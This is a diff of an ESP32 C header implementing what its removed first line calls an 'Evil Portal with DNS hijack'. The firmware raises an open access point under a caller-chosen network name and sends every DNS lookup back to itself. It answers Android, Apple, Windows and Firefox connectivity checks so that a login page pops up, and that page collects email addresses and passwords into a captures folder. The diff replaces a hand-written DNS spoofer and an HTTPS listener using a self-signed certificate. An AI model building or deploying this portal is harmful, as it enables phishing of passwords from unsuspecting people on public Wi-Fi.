@@ -1,119 +1,61 @@
-// wifi_portal.h - Evil Portal with DNS hijack + HTTPS captive portal
 #ifndef WIFI_PORTAL_H
 #define WIFI_PORTAL_H
 
 #include <stdint.h>
 #include <string.h>
+#include <sys/param.h>
+#include <sys/stat.h>
 #include "esp_wifi.h"
 #include "esp_event.h"
 #include "esp_log.h"
 #include "esp_http_server.h"
-#include "esp_https_server.h"
 #include "esp_netif.h"
 #include "esp_spiffs.h"
-#include <sys/stat.h>
-#include "freertos/FreeRTOS.h"
-#include "freertos/task.h"
-#include "lwip/sockets.h"
-#include "dhcpserver/dhcpserver.h"
-#include "portal_certs.h"
-
+#include "nvs_flash.h"
+#include "lwip/inet.h"
+#include "dns_server.h"
+#include "esp_mac.h"
 static const char *PORTAL_TAG = "Portal";
-static httpd_handle_t portal_http = NULL;
-static httpd_handle_t portal_https = NULL;
+static httpd_handle_t portal_server = NULL;
+static dns_server_handle_t dns_server = NULL;
 static char portal_ssid[33] = {0};
 static uint8_t portal_running = 0;
-static TaskHandle_t dns_task_handle = NULL;
-static uint8_t dns_running = 0;
 
-// ==================== DNS SERVER ====================
+extern const char portal_html_start[] asm("_binary_portal_html_start");
+extern const char portal_html_end[] asm("_binary_portal_html_end");
 
-static void portal_dns_task(void *param) {
-    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) {
-        ESP_LOGE(PORTAL_TAG, "DNS socket failed");
-        dns_running = 0;
-        vTaskDelete(NULL);
-        return;
+static void portal_wifi_event_handler(void *arg, esp_event_base_t event_base,
+                                      int32_t event_id, void *event_data) {
+    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
+        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
+        ESP_LOGI(PORTAL_TAG, "Station connected: " MACSTR, MAC2STR(event->mac));
+    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
+        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
+        ESP_LOGI(PORTAL_TAG, "Station disconnected: " MACSTR, MAC2STR(event->mac));
     }
-
-    int opt = 1;
-    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-
-    struct sockaddr_in addr = {
-        .sin_family = AF_INET,
-        .sin_port = htons(53),
-        .sin_addr.s_addr = htonl(INADDR_ANY),
-    };
-
-    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        ESP_LOGE(PORTAL_TAG, "DNS bind failed");
-        close(sock);
-        dns_running = 0;
-        vTaskDelete(NULL);
-        return;
-    }
-
-    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
-    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-    ESP_LOGI(PORTAL_TAG, "DNS listening on :53");
-
-    uint8_t buf[512];
-    struct sockaddr_in client;
-    socklen_t clen;
-    uint8_t ip[4] = {192, 168, 4, 1};
-
-    while (dns_running) {
-        clen = sizeof(client);
-        int len = recvfrom(sock, buf, sizeof(buf), 0,
-                           (struct sockaddr *)&client, &clen);
-        if (len < 12) continue;
-
-        char domain[64] = {0};
-        int d = 0, q = 12;
-        while (q < len && buf[q] != 0 && d < 62) {
-            uint8_t ll = buf[q++];
-            if (ll > 63) break;
-            if (d > 0) domain[d++] = '.';
-            for (uint8_t j = 0; j < ll && q < len && d < 63; j++)
-                domain[d++] = buf[q++];
-        }
-        domain[d] = 0;
-        ESP_LOGI(PORTAL_TAG, "DNS: %s", domain);
-
-        buf[2] = 0x85; buf[3] = 0x80;
-        buf[6] = 0x00; buf[7] = 0x01;
-        buf[8] = 0x00; buf[9] = 0x00;
-        buf[10] = 0x00; buf[11] = 0x00;
-
-        int pos = 12;
-        while (pos < len && buf[pos] != 0) pos += buf[pos] + 1;
-        pos += 5;
-
-        buf[pos++] = 0xC0; buf[pos++] = 0x0C;
-        buf[pos++] = 0x00; buf[pos++] = 0x01;
-        buf[pos++] = 0x00; buf[pos++] = 0x01;
-        buf[pos++] = 0x00; buf[pos++] = 0x00;
-        buf[pos++] = 0x00; buf[pos++] = 0x01;
-        buf[pos++] = 0x00; buf[pos++] = 0x04;
-        memcpy(&buf[pos], ip, 4);
-        pos += 4;
-
-        sendto(sock, buf, pos, 0, (struct sockaddr *)&client, clen);
-    }
-
-    close(sock);
-    dns_task_handle = NULL;
-    ESP_LOGI(PORTAL_TAG, "DNS stopped");
-    vTaskDelete(NULL);
+}
+static esp_err_t portal_detect_handler(httpd_req_t *req) {
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_type(req, "text/html");
+    const char *html = "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1'></head></html>";
+    httpd_resp_send(req, html, strlen(html));
+    return ESP_OK;
 }
 
-// ==================== HTTP HANDLERS ====================
-// Shared between HTTP (80) and HTTPS (443)
+static const httpd_uri_t portal_detect1 = {
+    .uri = "/generate_204",
+    .method = HTTP_GET,
+    .handler = portal_detect_handler
+};
 
+static const httpd_uri_t portal_detect2 = {
+    .uri = "/gen_204",
+    .method = HTTP_GET,
+    .handler = portal_detect_handler
+};
 static esp_err_t portal_page_handler(httpd_req_t *req) {
     ESP_LOGI(PORTAL_TAG, "Serving portal page");
-
+    
     FILE *f = fopen("/spiffs/sites/portal.html", "r");
     if (f) {
         fseek(f, 0, SEEK_END);
@@ -143,10 +85,11 @@ static esp_err_t portal_page_handler(httpd_req_t *req) {
         "button{width:100%;padding:14px;background:#007bff;color:#fff;border:none;border-radius:6px;font-size:16px}"
         ".c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1)}"
         "</style></head><body><div class='c'><h2>Connect to WiFi</h2>"
-        "<form method='POST' action='http://192.168.4.1/submit'>"
+        "<form method='POST' action='/submit'>"
         "<input name='email' placeholder='Email' required>"
         "<input type='password' name='password' placeholder='Password' required>"
         "<button type='submit'>Connect</button></form></div></body></html>";
+    
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, fb, strlen(fb));
     return ESP_OK;
@@ -155,18 +98,29 @@ static esp_err_t portal_page_handler(httpd_req_t *req) {
 static esp_err_t portal_submit_handler(httpd_req_t *req) {
     char buf[512];
     int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
-    if (ret <= 0) { httpd_resp_send_500(req); return ESP_FAIL; }
+    if (ret <= 0) {
+        httpd_resp_send_500(req);
+        return ESP_FAIL;
+    }
     buf[ret] = 0;
 
     char email[128] = {0}, password[128] = {0};
     char *p;
     if ((p = strstr(buf, "email=")) != NULL) {
-        p += 6; char *e = strchr(p, '&'); if (!e) e = p + strlen(p);
-        int l = e - p; if (l > 127) l = 127; strncpy(email, p, l);
+        p += 6;
+        char *e = strchr(p, '&');
+        if (!e) e = p + strlen(p);
+        int l = e - p;
+        if (l > 127) l = 127;
+        strncpy(email, p, l);
     }
     if ((p = strstr(buf, "password=")) != NULL) {
-        p += 9; char *e = strchr(p, '&'); if (!e) e = p + strlen(p);
-        int l = e - p; if (l > 127) l = 127; strncpy(password, p, l);
+        p += 9;
+        char *e = strchr(p, '&');
+        if (!e) e = p + strlen(p);
+        int l = e - p;
+        if (l > 127) l = 127;
+        strncpy(password, p, l);
     }
 
     mkdir("/spiffs/captures", 0755);
@@ -180,97 +134,64 @@ static esp_err_t portal_submit_handler(httpd_req_t *req) {
     const char *resp =
         "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
         "<h2>Connecting...</h2><p>Please wait.</p>"
-        "<script>setTimeout(function(){window.location='http://192.168.4.1/';},3000);</script></body></html>";
+        "<script>setTimeout(function(){window.location='/';},3000);</script></body></html>";
+    
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, resp, strlen(resp));
     return ESP_OK;
 }
 
-
-// wifi_portal.h - Add Android CaptivePortalLogin intent trigger
-
-static esp_err_t portal_detect_handler(httpd_req_t *req) {
-    ESP_LOGI(PORTAL_TAG, "Portal detect: %s", req->uri);
+static esp_err_t portal_404_handler(httpd_req_t *req, httpd_err_code_t err) {
+    ESP_LOGI(PORTAL_TAG, "Redirecting 404: %s", req->uri);
     
-    // Android expects 204 for "no captive portal" but we want to trigger it
-    // Return 200 with redirect to force portal popup
-    httpd_resp_set_status(req, "200 OK");
-    httpd_resp_set_type(req, "text/html");
-    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
-    httpd_resp_set_hdr(req, "Pragma", "no-cache");
-    httpd_resp_set_hdr(req, "Expires", "0");
+    // For Android captive portal detection
+    if (strstr(req->uri, "generate_204") || strstr(req->uri, "gen_204") ||
+        strstr(req->uri, "connectivitycheck") || strstr(req->uri, "connectivity-check")) {
+        // Return 200 with content (not 204) to trigger portal
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "text/html");
+        const char *redirect = "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1'></head></html>";
+        httpd_resp_send(req, redirect, strlen(redirect));
+        return ESP_OK;
+    }
     
-    // HTML meta redirect triggers Android's CaptivePortalLogin activity
-    const char *html = 
-        "<!DOCTYPE html><html><head>"
-        "<meta http-equiv='refresh' content='0; url=http://192.168.4.1/'>"
-        "</head><body>Redirecting...</body></html>";
-    
-    httpd_resp_send(req, html, strlen(html));
+    // Standard 303 redirect for everything else
+    httpd_resp_set_status(req, "303 See Other");
+    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1");
+    // iOS needs content in response
+    httpd_resp_send(req, "Redirect to the captive portal", HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
 
-static esp_err_t portal_catchall_handler(httpd_req_t *req) {
-    ESP_LOGI(PORTAL_TAG, "Catch-all: %s", req->uri);
-    
-    // For Android Chrome: return HTML with meta redirect instead of 302
-    httpd_resp_set_status(req, "200 OK");
-    httpd_resp_set_type(req, "text/html");
-    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
-    
-    const char *html = 
-        "<!DOCTYPE html><html><head>"
-        "<meta http-equiv='refresh' content='0; url=http://192.168.4.1/'>"
-        "</head><body>Redirecting to login...</body></html>";
-    
-    httpd_resp_send(req, html, strlen(html));
-    return ESP_OK;
+static const httpd_uri_t portal_root = {
+    .uri = "/",
+    .method = HTTP_GET,
+    .handler = portal_page_handler
+};
+
+static const httpd_uri_t portal_submit = {
+    .uri = "/submit",
+    .method = HTTP_POST,
+    .handler = portal_submit_handler
+};
+
+static httpd_handle_t portal_start_webserver(void) {
+    httpd_handle_t server = NULL;
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.max_open_sockets = 7;
+    config.lru_purge_enable = true;
+
+    ESP_LOGI(PORTAL_TAG, "Starting HTTP server on port: %d", config.server_port);
+    if (httpd_start(&server, &config) == ESP_OK) {
+        ESP_LOGI(PORTAL_TAG, "Registering URI handlers");
+        httpd_register_uri_handler(server, &portal_root);
+        httpd_register_uri_handler(server, &portal_submit);
+httpd_register_uri_handler(server, &portal_detect1);
+httpd_register_uri_handler(server, &portal_detect2);
+        httpd_register_err_handler(server, HTTPD_404_NOT_FOUND, portal_404_handler);
+    }
+    return server;
 }
-
-// Register these additional Android-specific endpoints
-static void portal_register_handlers(httpd_handle_t server) {
-    httpd_uri_t u;
-
-    u = (httpd_uri_t){.uri = "/", .method = HTTP_GET, .handler = portal_page_handler};
-    httpd_register_uri_handler(server, &u);
-    u = (httpd_uri_t){.uri = "/submit", .method = HTTP_POST, .handler = portal_submit_handler};
-    httpd_register_uri_handler(server, &u);
-
-    // Android specific - return 200 with HTML redirect, not 302
-    u = (httpd_uri_t){.uri = "/generate_204", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-    u = (httpd_uri_t){.uri = "/gen_204", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-    
-    // Chrome uses this
-    u = (httpd_uri_t){.uri = "/connectivity-check.html", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-    u = (httpd_uri_t){.uri = "/connectivitycheck/gstatic.html", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-
-    // Apple
-    u = (httpd_uri_t){.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-    u = (httpd_uri_t){.uri = "/library/test/success.html", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-
-    // Windows
-    u = (httpd_uri_t){.uri = "/ncsi.txt", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-    u = (httpd_uri_t){.uri = "/connecttest.txt", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-
-    // Firefox
-    u = (httpd_uri_t){.uri = "/success.txt", .method = HTTP_GET, .handler = portal_detect_handler};
-    httpd_register_uri_handler(server, &u);
-
-    // Catch-all LAST (wildcard matches everything)
-    u = (httpd_uri_t){.uri = "/*", .method = HTTP_GET, .handler = portal_catchall_handler};
-    httpd_register_uri_handler(server, &u);
-}
-// ==================== REGISTER HANDLERS ====================
-
-// ==================== START / STOP ====================
 
 static inline uint8_t portal_start(const char *ssid) {
     if (portal_running) return 0;
@@ -278,54 +199,63 @@ static inline uint8_t portal_start(const char *ssid) {
     strncpy(portal_ssid, ssid, 32);
     portal_ssid[32] = 0;
 
-    esp_wifi_disconnect();
-    esp_wifi_stop();
-    esp_wifi_deinit();
-    vTaskDelay(pdMS_TO_TICKS(200));
+    esp_log_level_set("httpd_uri", ESP_LOG_ERROR);
+    esp_log_level_set("httpd_txrx", ESP_LOG_ERROR);
+    esp_log_level_set("httpd_parse", ESP_LOG_ERROR);
 
+    // Check if already initialized
     esp_err_t err;
     err = esp_netif_init();
-    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
+    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
+        ESP_ERROR_CHECK(err);
+    }
+    
     err = esp_event_loop_create_default();
-    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
+    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
+        ESP_ERROR_CHECK(err);
+    }
+    
+    err = nvs_flash_init();
+    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+        ESP_ERROR_CHECK(nvs_flash_erase());
+        err = nvs_flash_init();
+    }
+    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
+        ESP_ERROR_CHECK(err);
+    }
 
-    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (!ap) ap = esp_netif_create_default_wifi_ap();
+    esp_netif_create_default_wifi_ap();
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_wifi_event_handler, NULL));
 
-    wifi_config_t wc = {
+    wifi_config_t wifi_config = {
         .ap = {
             .ssid_len = strlen(ssid),
-            .channel = 6,
             .max_connection = 8,
             .authmode = WIFI_AUTH_OPEN,
+            .channel = 6,
             .beacon_interval = 100,
         },
     };
-    strncpy((char *)wc.ap.ssid, ssid, 32);
-    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wc));
+    strncpy((char *)wifi_config.ap.ssid, ssid, 32);
+
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
     ESP_ERROR_CHECK(esp_wifi_start());
-    ESP_LOGI(PORTAL_TAG, "AP started: %s", ssid);
 
-    // DHCP: advertise ourselves as DNS
-    esp_netif_dhcps_stop(ap);
-    esp_netif_dns_info_t dns = {0};
-    dns.ip.u_addr.ip4.addr = ESP_IP4TOADDR(192, 168, 4, 1);
-    dns.ip.type = ESP_IPADDR_TYPE_V4;
-    ESP_ERROR_CHECK(esp_netif_set_dns_info(ap, ESP_NETIF_DNS_MAIN, &dns));
-    dhcps_offer_t offer = OFFER_DNS;
-    ESP_ERROR_CHECK(esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET,
-        ESP_NETIF_DOMAIN_NAME_SERVER, &offer, sizeof(offer)));
-    ESP_ERROR_CHECK(esp_netif_dhcps_start(ap));
-    ESP_LOGI(PORTAL_TAG, "DHCP DNS=192.168.4.1");
+    esp_netif_ip_info_t ip_info;
+    esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"), &ip_info);
+    char ip_addr[16];
+    inet_ntoa_r(ip_info.ip.addr, ip_addr, 16);
+    ESP_LOGI(PORTAL_TAG, "AP started: %s with IP: %s", ssid, ip_addr);
 
-    // SPIFFS
     esp_vfs_spiffs_conf_t sc = {
-        .base_path = "/spiffs", .partition_label = NULL,
-        .max_files = 5, .format_if_mount_failed = true
+        .base_path = "/spiffs",
+        .partition_label = NULL,
+        .max_files = 5,
+        .format_if_mount_failed = true
     };
     err = esp_vfs_spiffs_register(&sc);
     if (err != ESP_OK && err != ESP_ERR_INVALID_STATE)
@@ -333,44 +263,12 @@ static inline uint8_t portal_start(const char *ssid) {
     mkdir("/spiffs/sites", 0755);
     mkdir("/spiffs/captures", 0755);
 
-    // DNS hijack
-    dns_running = 1;
-    xTaskCreate(portal_dns_task, "dns", 4096, NULL, 5, &dns_task_handle);
+    portal_server = portal_start_webserver();
 
-    // HTTP server on port 80
-    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
-    hc.server_port = 80;
-    hc.uri_match_fn = httpd_uri_match_wildcard;
-    hc.max_uri_handlers = 14;
-    hc.lru_purge_enable = true;
+    dns_server_config_t dns_config = DNS_SERVER_CONFIG_SINGLE("*", "WIFI_AP_DEF");
+    dns_server = start_dns_server(&dns_config);
 
-    if (httpd_start(&portal_http, &hc) != ESP_OK) {
-        ESP_LOGE(PORTAL_TAG, "HTTP start failed");
-        dns_running = 0;
-        return 0;
-    }
-    portal_register_handlers(portal_http);
-    ESP_LOGI(PORTAL_TAG, "HTTP listening on :80");
-
-    // HTTPS server on port 443 with self-signed cert
-    httpd_ssl_config_t ssl = HTTPD_SSL_CONFIG_DEFAULT();
-    ssl.servercert = portal_cert_pem;
-    ssl.servercert_len = portal_cert_pem_len;
-    ssl.prvtkey_pem = portal_key_pem;
-    ssl.prvtkey_len = portal_key_pem_len;
-    ssl.httpd.uri_match_fn = httpd_uri_match_wildcard;
-    ssl.httpd.max_uri_handlers = 14;
-    ssl.httpd.lru_purge_enable = true;
-    ssl.transport_mode = HTTPD_SSL_TRANSPORT_SECURE;
-
-    if (httpd_ssl_start(&portal_https, &ssl) != ESP_OK) {
-        ESP_LOGW(PORTAL_TAG, "HTTPS start failed - continuing with HTTP only");
-    } else {
-        portal_register_handlers(portal_https);
-        ESP_LOGI(PORTAL_TAG, "HTTPS listening on :443");
-    }
-
-    ESP_LOGI(PORTAL_TAG, "Portal active on 192.168.4.1");
+    ESP_LOGI(PORTAL_TAG, "Portal active");
     portal_running = 1;
     return 1;
 }
@@ -378,13 +276,15 @@ static inline uint8_t portal_start(const char *ssid) {
 static inline void portal_stop(void) {
     if (!portal_running) return;
 
-    dns_running = 0;
-    uint8_t wait = 0;
-    while (dns_task_handle && wait++ < 30)
-        vTaskDelay(pdMS_TO_TICKS(100));
+    if (dns_server) {
+        stop_dns_server(dns_server);
+        dns_server = NULL;
+    }
 
-    if (portal_http) { httpd_stop(portal_http); portal_http = NULL; }
-    if (portal_https) { httpd_ssl_stop(portal_https); portal_https = NULL; }
+    if (portal_server) {
+        httpd_stop(portal_server);
+        portal_server = NULL;
+    }
 
     esp_wifi_stop();
     portal_running = 0;
